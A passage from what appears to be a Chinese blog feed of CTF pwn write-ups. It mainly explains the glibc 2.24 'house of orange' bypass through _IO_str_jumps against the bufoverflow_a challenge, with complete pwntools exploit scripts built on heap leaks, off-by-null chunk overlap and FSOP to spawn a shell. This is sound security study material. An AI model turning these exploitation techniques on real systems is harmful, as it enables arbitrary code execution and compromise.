class="hljs-string">&#x27;heap_base---&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base)) <br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(p64(<span class="hljs-number">0x91</span>)*<span class="hljs-number">14</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">7</span>-i)<br><br><br>free(<span class="hljs-number">0</span>)<br><br>freeall()<br>payload = <span class="hljs-string">b&#x27;\xffaaa&#x27;</span> + p64(heap_base+<span class="hljs-number">0x2c0</span>)[:<span class="hljs-number">2</span>]<br>add(<span class="hljs-string">&#x27;a&#x27;</span>,payload) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;data: &#x27;</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>one = libc_base + <span class="hljs-number">0xe6af1</span><br><br><br>add(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">b&#x27;\xffaaa\x80&#x27;</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>freeall()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) +p64(heap_base+<span class="hljs-number">0x560</span>) + p64(heap_base +<span class="hljs-number">0x10</span>)+ p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>)+ p64(free_hook)<br>add(payload,<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>add(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>,<span class="hljs-string">&#x27;\xff&#x27;</span>+<span class="hljs-string">&#x27;sh\x00\x00\x00\x00&#x27;</span>) <span class="hljs-comment">#2</span><br><br><span class="hljs-comment">#gdb.attach(io)</span><br>add(p64(one),<span class="hljs-string">&#x27;\xff&#x27;</span>+<span class="hljs-string">&#x27;sh\x00\x00\x00\x00&#x27;</span>) <span class="hljs-comment">#3</span><br><br>free(<span class="hljs-number">3</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>freeall()<br><br><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>赛题WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>赛题复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc.2.24-2.26——house of orange</title>
    <link href="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/"/>
    <url>/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/</url>
    
    <content type="html"><![CDATA[<h2 id="glibc-2-24-2-26——house-of-orange"><a href="#glibc-2-24-2-26——house-of-orange" class="headerlink" title="glibc.2.24-2.26——house of orange"></a><strong>glibc.2.24-2.26——house of orange</strong></h2><p>上次说到glibc2.23的house of orange 以及相关的FSOP手法，由于在glibc2.24之后加入了对vtable的检查，导致之前那种方法失效，2.24的检查是<code>IO_validate_vtable</code>要求我们的<code>vtable</code>必须在<code>__stop___libc_IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间，所以我们之前伪造在heap上的方法<strong>就失效了</strong>，但是仍然有新的方法去绕过这个检查</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a><strong>方法</strong></h3><p>使用 vtable 内的地址来作为 vtable 的地址，大致可以分为两个结构体_IO_str_jumps 或 _IO_wstr_jumps ，他们都会调用 _IO_str_overflow，以  _IO_str_jumps 为例</p><p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801105317095.png" alt="image-20240801105317095"></p><p>注意看它会调用 _IO_str_finnish </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意看它在一定条件的时候会把_IO_buf_base 当做参数并调用   (_IO_strfile *) fp)-&gt;_s._free_buffer)指针所指地址,在GDB分析得此处地址就是fp+0xe8处的位置，那么把此处伪造成_IO_str_jumps-8的位置，那么在调用   _IO_overflow的时候就会调用到 _IO_str_finnish ，那么把fp+0xe8处的地址放上system，  _IO_buf_base 处的地址放上 &#x2F;bin&#x2F;sh地址，那么也可以实现调用system来获取shell，不过要注意，2.24之后我们不能直接放入&#x2F;bin&#x2F;sh字符串了，而是要用libc里面的&#x2F;bin&#x2F;sh地址，不过这次我们不用泄露heap地址了，但是对于有些题目还是需要的，比如接下来的这道题目。</p><h3 id="题目演示"><a href="#题目演示" class="headerlink" title="题目演示"></a>题目演示</h3><h4 id="程序保护情况"><a href="#程序保护情况" class="headerlink" title="程序保护情况"></a><strong>程序保护情况</strong></h4><p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801111925028.png" alt="image-20240801111925028"></p><h3 id="64位ida逆向"><a href="#64位ida逆向" class="headerlink" title="64位ida逆向"></a><strong>64位ida逆向</strong></h3><p>菜单</p><p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112328481.png" alt="image-20240801112328481"></p><p>add函数，申请堆块有个数限制，并且前两个使用malloc申请后来都使用，calloc申请，也就是意味着，我们要泄露地址只能靠前面两个堆块</p><p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112556176.png" alt="image-20240801112556176"></p><p>free函数，指针清空，没有UAF</p><p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112727430.png" alt="image-20240801112727430"></p><p>show函数，存在00截断</p><p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801112820737.png" alt="image-20240801112820737"></p><p>edit函数，不幸的是我们只能编辑最后申请的堆块，但是存在off_by_null 漏洞</p><p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801113217034.png" alt="image-20240801113217034"></p><p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801113227238.png" alt="image-20240801113227238"></p><p><img src="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/image-20240801113632295.png" alt="image-20240801113632295"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>1.泄露libc地址，这个好办，因为前两个是通过malloc申请的，本地环境是glibc2.24，所以我们申请unsortbin堆块范围大小，然后释放掉这样堆块上会有残留的地址，之后申请回来然后show就可以得到libc地址</p><p>2.泄露heap地址，这题是2.24版本，house of orange 不需要heap地址啊，为什么要泄露？？因为此题也没有溢出，那么我们想要溢出那么就要实现堆块重叠，然后修改到unsortbin的指针，那么我们就要伪造unsortbin堆块，再利用off_by_null实现堆块合并topchunk的前移，那么就需要伪造fd,bk指针，所以要泄露heap地址，那么该怎么泄露呢，因为不能溢出所以unsrotbin attack方法自然不能用了，所以可以利用largebin 来泄露，让释放堆块残留的fd_nextsize指针来泄露heap地址，因为calloc在申请堆块的时候会清空堆块内容所以我们让topchunk将所有的堆块合并，此时largebin那些残留的地址还留在堆块上，然后此时申请比第一个申请堆块（泄露libc_地址大0x10）的堆块，因为此时数据区域指向fd_nextsize处，所以此时再次申请一个堆块就可以泄露出heap地址</p><p>3.接下来利用off_by_null来伪造堆块，因为我们要达到堆块重叠</p><p>4.由于calloc申请堆块会清空堆块内容所以要恢复堆块头</p><p>5.绕过libc检查，及构造两个fake_chunk大小加起来和大chunk大小一样</p><p>6.FSOP</p><h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a><strong>泄露libc地址</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span><br>show()<br>io.recv(<span class="hljs-number">1</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - (<span class="hljs-number">0x000076ec9e399b58</span> - <span class="hljs-number">0x76ec9e399af0</span>) - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>_IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br><br></code></pre></td></tr></table></figure><h3 id="泄露heap地址"><a href="#泄露heap地址" class="headerlink" title="泄露heap地址"></a><strong>泄露heap地址</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x400</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>gdb.attach(io)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x90</span>)<br>add(<span class="hljs-number">0x80</span>)<br><br>show()<br>io.recvuntil(<span class="hljs-string">&#x27;\x20&#x27;</span>)<br>heap_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0xb0</span><br>success(<span class="hljs-string">&#x27;heap_addr-----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_addr))<br></code></pre></td></tr></table></figure><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off_by_null"></a><strong>off_by_null</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py">free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#0</span><br><br>fake_chunk = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>fake_chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x1E1</span>)<br>fake_chunk += p64(heap_addr + <span class="hljs-number">0x50</span>)*<span class="hljs-number">2</span><br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x1E0</span>)<br><br>edit(fake_chunk)<br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br><br>edit(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x270</span>))<br>free(<span class="hljs-number">2</span>)<br><br></code></pre></td></tr></table></figure><h3 id="恢复堆块结构"><a href="#恢复堆块结构" class="headerlink" title="恢复堆块结构"></a><strong>恢复堆块结构</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x290</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x1d0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) +<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><h3 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a><strong>绕过检查</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x290</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x151</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(payload)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x290</span>)<br><br></code></pre></td></tr></table></figure><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a><strong>FSOP</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py">add(<span class="hljs-number">0x290</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>file = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) + p64(_IO_list_all - <span class="hljs-number">0x10</span>)<br>file += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">110</span>) +p64(<span class="hljs-number">0xdeadbeef</span>) + p64(binsh)<br>file = file.ljust(<span class="hljs-number">0xD8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>file += p64(_IO_str_jumps - <span class="hljs-number">0x8</span>)<br>file +=  p64(<span class="hljs-number">0</span>) + p64(system) +<span class="hljs-string">b&#x27;\n&#x27;</span><br>payload += file<br>edit(payload)<br>add(<span class="hljs-number">0x90</span>)<br><br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a><strong>EXP</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./bufoverflow_a&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,msg)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span><br>show()<br>io.recv(<span class="hljs-number">1</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - (<span class="hljs-number">0x000076ec9e399b58</span> - <span class="hljs-number">0x76ec9e399af0</span>) - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>_IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_IO_str_jumps</span>():<br>   IO_file_jumps_offset = libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>   IO_str_underflow_offset = libc.sym[<span class="hljs-string">&#x27;_IO_str_underflow&#x27;</span>]<br>   <span class="hljs-keyword">for</span> ref_offset <span class="hljs-keyword">in</span> libc.search(p64(IO_str_underflow_offset)):<br>       possible_IO_str_jumps_offset = ref_offset - <span class="hljs-number">0x20</span><br>       <span class="hljs-keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:<br>          success(<span class="hljs-string">&#x27;_IO_str_jumps----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(possible_IO_str_jumps_offset))<br>          <span class="hljs-keyword">return</span> possible_IO_str_jumps_offset<br><br><br><br><br><br>_IO_str_jumps = libc_base + get_IO_str_jumps()<br>success(<span class="hljs-string">&#x27;_IO_file_jumps----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(_IO_str_jumps))<br>pause()<br>add(<span class="hljs-number">0x400</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>gdb.attach(io)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x90</span>)<br>add(<span class="hljs-number">0x80</span>)<br><br>show()<br>io.recvuntil(<span class="hljs-string">&#x27;\x20&#x27;</span>)<br>heap_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0xb0</span><br>success(<span class="hljs-string">&#x27;heap_addr-----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_addr))<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#0</span><br><br>fake_chunk = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>fake_chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x1E1</span>)<br>fake_chunk += p64(heap_addr + <span class="hljs-number">0x50</span>)*<span class="hljs-number">2</span><br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x1E0</span>)<br><br>edit(fake_chunk)<br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br><br>edit(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x270</span>))<br>free(<span class="hljs-number">2</span>)<br>gdb.attach(io)<br>add(<span class="hljs-number">0x290</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x1d0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) +<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x290</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x151</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(payload)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x290</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> <br>file = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) + p64(_IO_list_all - <span class="hljs-number">0x10</span>) <br>file += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">110</span>) +p64(<span class="hljs-number">0xdeadbeef</span>) + p64(binsh) <br>file = file.ljust(<span class="hljs-number">0xD8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>file += p64(_IO_str_jumps - <span class="hljs-number">0x8</span>) <br>file +=  p64(<span class="hljs-number">0</span>) + p64(system) +<span class="hljs-string">b&#x27;\n&#x27;</span><br>payload += file<br>edit(payload)<br>add(<span class="hljs-number">0x90</span>)<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h3><p><a href="https://blog.csdn.net/seaaseesa/article/details/104390952">攻防世界PWN之bufoverflow_a题解(house of orange in 2.24&amp;house of Einherjar)_pwn houseoforange 2.24bypass-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X GFCTF 2022十月挑战赛-PWN-WP</title>
    <link href="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/"/>
    <url>/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/</url>
    
